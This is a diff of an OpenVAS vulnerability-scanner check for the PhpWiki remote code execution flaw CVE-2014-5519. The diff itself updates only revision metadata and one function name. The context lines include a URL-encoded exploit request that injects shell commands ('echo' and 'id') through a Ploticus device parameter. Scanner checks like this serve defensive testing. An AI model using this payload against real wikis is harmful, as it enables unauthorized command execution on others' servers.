@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_phpwiki_rce_08_14.nasl 11222 2018-09-04 12:41:44Z cfischer $
+# $Id: gb_phpwiki_rce_08_14.nasl 13659 2019-02-14 08:34:21Z cfischer $
 #
 # PhpWiki Remote Code Execution Vulnerability
 #
@@ -28,14 +28,14 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105074");
-  script_version("$Revision: 11222 $");
+  script_version("$Revision: 13659 $");
   script_cve_id("CVE-2014-5519");
   script_bugtraq_id(69444);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("PhpWiki Remote Code Execution Vulnerability");
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34451/");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
   script_tag(name:"creation_date", value:"2014-08-29 11:48:21 +0200 (Fri, 29 Aug 2014)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -69,7 +69,7 @@ foreach dir( make_list_unique( "/phpwiki", "/wiki", cgi_dirs( port:port) ) ) {
   buf = http_get_cache( item:url, port:port );
 
   if( "Powered by PhpWiki" >< buf ) {
-    useragent = get_http_user_agent();
+    useragent = http_get_user_agent();
     host = http_host_name( port:port );
     ex = 'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27+1%3E%262%3B' +
          'id' +
